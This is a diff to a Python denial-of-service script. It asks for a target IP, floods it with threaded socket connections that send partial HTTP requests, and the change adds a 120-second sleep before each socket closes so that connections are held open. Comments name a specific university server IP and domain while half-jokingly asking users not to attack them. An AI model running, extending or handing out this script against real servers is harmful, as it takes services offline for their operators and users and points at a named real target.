@@ -1,8 +1,9 @@
 #just in case you are using it for eduserver or something please dont
 #eduserver IP address = 103.241.136.151
 
-import socket
 import threading
+import socket
+import time
 
 print("\n\n\n Dont try this on eduserver or nitc.ac.in please :) \n\n\n ")
 target = str(input("Target IP : "))
@@ -15,6 +16,7 @@ def attack():
         s.connect((target,port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
         s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
+        time.sleep(120)
         s.close()
 
 #threads
